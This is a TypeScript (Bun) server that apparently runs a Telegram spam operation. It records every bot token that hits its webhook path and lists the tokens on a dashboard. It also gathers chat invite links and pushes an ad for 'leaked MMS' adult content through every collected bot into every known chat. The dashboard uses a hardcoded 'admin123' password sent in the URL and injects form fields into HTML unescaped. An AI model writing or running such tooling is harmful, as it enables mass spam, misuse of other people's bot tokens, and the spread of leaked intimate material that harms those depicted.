import { serve } from "bun";
import NodeCache from "node-cache";

interface TelegramUpdate {
  message?: any;
  edited_message?: any;
  channel_post?: any;
  edited_channel_post?: any;
  my_chat_member?: any;
  chat_member?: any;
  chat_join_request?: any;
}

const cache = new NodeCache();

cache.set("ads", {
  permanent: {
    imageSource: "https://i.ibb.co/J66PqCQ/x.jpg",
    captionText: `🔥 <b>NEW MMS LEAKS ARE OUT!</b> 🔥\n\n💥 <b><u>EXCLUSIVE PREMIUM CONTENT</u></b> 💥\n\n🎬 <i>Fresh leaked content daily</i>\n🔞 <b>18+ Adult Material</b>\n💎 <i>Premium quality videos & files</i>\n🚀 <b>Instant access available</b>\n\n⬇️ <b><u>Click any server below</u></b> ⬇️`,
    actionLinks: [
      { linkText: "🎥 VIDEOS💦", linkDestination: "https://t.me/+Go8FEdh9M8Y3ZWU1" },
      { linkText: "📁 FILES🍑", linkDestination: "https://t.me/+06bZb-fbn4kzNjll" }
    ]
  },
  temporary: null
});

serve({
  port: 3000,
  async fetch(req) {
    const url = new URL(req.url);
    const path = url.pathname;
    const method = req.method;
    const pass = url.searchParams.get("pass");

    if (method === "GET" && path === "/") {
      if (pass !== "admin123") {
        return new Response(`<form><input name='pass'><button>Login</button></form>`, {
          headers: { "Content-Type": "text/html" },
        });
      }

      const stats = {
        total: cache.get("total_messages") || 0,
        users: Array.from(new Set((cache.get("users") || []) as string[])),
        bots: Array.from(new Set((cache.get("bots") || []) as string[])),
        ads: cache.get("ads") || {},
        tokenResponses: cache.get("token_responses") || {}
      };

      // Sort tokens by response count & take top 100
      const sortedTokens = Object.entries(stats.tokenResponses)
        .sort((a, b) => (b[1] as number) - (a[1] as number))
        .slice(0, 100);

      // Find the max count for relative bar width
      const maxCount = Math.max(...sortedTokens.map(([_, count]) => count as number), 1);

      // Render tokens clearly with wrapping and labels for visibility
      const tokenBar = sortedTokens.map(([token, count]) => {
        const widthPercent = (count as number / maxCount) * 100;
        return `
          <div style="margin:12px 0; padding: 6px; background:#1a1a1a; border-radius: 6px;">
            <div style="font-family: monospace; word-break: break-all; color:#f97316; margin-bottom: 4px;">Token: ${token}</div>
            <div style="background:#333; width:100%; height:20px; border-radius:5px; overflow:hidden;">
              <div style="background:#f97316; width:${widthPercent}%; height:100%"></div>
            </div>
            <div style="color:#ccc; margin-top: 4px;">Responses: <b>${count}</b></div>
          </div>
        `;
      }).join("");

      const form = (type: string, ad: any) => `
        <h3>${type.toUpperCase()} AD</h3>
        <form method='POST' action='/update-ad?type=${type}&pass=admin123'>
          <input name='imageSource' placeholder='Image URL' value="${ad?.imageSource || ''}" style='width:100%'><br>
          <textarea name='captionText' placeholder='Caption' rows=6 style='width:100%'>${ad?.captionText || ''}</textarea><br>
          <textarea name='actionLinks' placeholder='[{\"linkText\":\"Text\", \"linkDestination\":\"URL\"}]' style='width:100%'>${JSON.stringify(ad?.actionLinks || [], null, 2)}</textarea><br>
          <button>Update ${type} Ad</button>
        </form>`;

      return new Response(`<!DOCTYPE html><html><head><meta charset="UTF-8"><style>
        body { background:black; color:white; font-family:sans-serif; padding:2em; }
        h1, h2, h3 { color: #f97316; }
        button { padding: 10px 20px; margin: 10px 0; background: #f97316; border: none; border-radius: 5px; color: white; font-weight: bold; cursor: pointer; }
        textarea, input { margin: 5px 0; padding: 10px; border-radius: 5px; border: none; }
        pre { background: #1e1e1e; padding: 1em; border-radius: 8px; max-height: 300px; overflow-y: auto; }
      </style></head><body>
        <h1>📊 Bot Dashboard</h1>
        <p><b>Total Messages:</b> ${stats.total}</p>
        <p><b>Users:</b> ${stats.users.length}</p>
        <p><b>Bots:</b> ${stats.bots.length}</p>

        <form method='POST' action='/clear-cache?pass=admin123'>
          <button type='submit'>🗑 Clear Cache</button>
        </form>

        <h2>🔥 Top 100 Tokens by Responses</h2>
        ${tokenBar}

        ${form("permanent", stats.ads.permanent)}
        ${form("temporary", stats.ads.temporary)}
      </body></html>`, { headers: { "Content-Type": "text/html" } });
    }

    if (method === "POST" && path === "/send-to-channels" && pass === "admin123") {
      const bots = Array.from(new Set((cache.get("bots") || []) as string[]));
      const chatLinks = cache.get("chat_links") || {};
      const ads = cache.get("ads") || {};
      const ad = ads.temporary || ads.permanent;

      for (const bot of bots) {
        for (const chatId of Object.keys(chatLinks)) {
          fetch(`https://api.telegram.org/bot${bot}/sendPhoto`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: chatId,
              photo: ad.imageSource,
              caption: ad.captionText,
              parse_mode: "HTML",
              reply_markup: {
                inline_keyboard: ad.actionLinks.map((l: any) => [{ text: l.linkText, url: l.linkDestination }])
              }
            })
          }).catch(() => {});
        }
      }
      return new Response(`<script>alert('✅ Sent to All');location.href='/?pass=admin123'</script>`, { headers: { "Content-Type": "text/html" } });
    }

    if (method === "POST" && path === "/update-ad" && pass === "admin123") {
      const formData = await req.formData();
      const type = url.searchParams.get("type")!;
      const imageSource = formData.get("imageSource")?.toString();
      const captionText = formData.get("captionText")?.toString();
      const actionLinksRaw = formData.get("actionLinks")?.toString();
      try {
        const ads = cache.get("ads") || {};
        ads[type] = {
          imageSource,
          captionText,
          actionLinks: JSON.parse(actionLinksRaw || "[]")
        };
        cache.set("ads", ads);
        return new Response(`<script>alert('✅ ${type.toUpperCase()} ad updated');location.href='/?pass=admin123'</script>`, { headers: { "Content-Type": "text/html" } });
      } catch {
        return new Response(`<script>alert('❌ Invalid input');location.href='/?pass=admin123'</script>`, { headers: { "Content-Type": "text/html" } });
      }
    }

    if (method === "POST" && path.startsWith("/webhook/")) {
      const botToken = path.replace("/webhook/", "");
      const update: TelegramUpdate = await req.json();

      // Track bot tokens
      const bots = cache.get("bots") || [];
      cache.set("bots", Array.from(new Set([...bots as string[], botToken])));

      // Track token responses count
      const tokenResponses = cache.get("token_responses") || {};
      tokenResponses[botToken] = (tokenResponses[botToken] || 0) + 1;
      cache.set("token_responses", tokenResponses);

      const activity = update.message || update.edited_message || update.channel_post || update.edited_channel_post || update.my_chat_member || update.chat_member || update.chat_join_request;
      if (!activity) return new Response("Ignored");

      const chatId = activity.chat?.id || activity.chat?.chat?.id || activity.from?.id;
      const userId = activity.from?.id?.toString();
      const users = cache.get("users") || [];
      const chatLinks = cache.get("chat_links") || {};
      if (userId) cache.set("users", Array.from(new Set([...users as string[], userId])));

      if (!chatLinks[chatId]) {
        fetch(`https://api.telegram.org/bot${botToken}/getChat`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: chatId })
        })
        .then(res => res.json())
        .then(result => {
          if (result.ok) {
            const info = result.result;
            const link = info.username ? `https://t.me/${info.username}` : info.invite_link || `https://t.me/c/${String(chatId).replace("-100", "")}`;
            chatLinks[chatId] = link;
            cache.set("chat_links", chatLinks);
          }
        }).catch(() => {});
      }

      const ads = cache.get("ads") || {};
      const ad = ads.temporary || ads.permanent;

      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          photo: ad.imageSource,
          caption: ad.captionText,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: ad.actionLinks.map((l: any) => [{ text: l.linkText, url: l.linkDestination }])
          }
        })
      }).catch(() => {});

      const total = (cache.get("total_messages") as number) || 0;
      cache.set("total_messages", total + 1);

      return new Response("OK");
    }

    if (method === "POST" && path === "/clear-cache" && pass === "admin123") {
      cache.flushAll();
      return new Response(`<script>alert('🗑 Cache Cleared');location.href='/?pass=admin123'</script>`, {
        headers: { "Content-Type": "text/html" },
      });
    }

    return new Response("Not Found", { status: 404 });
  }
});

console.log("✅ Ultra-fast full-activity bot dashboard is live on http://localhost:3000");
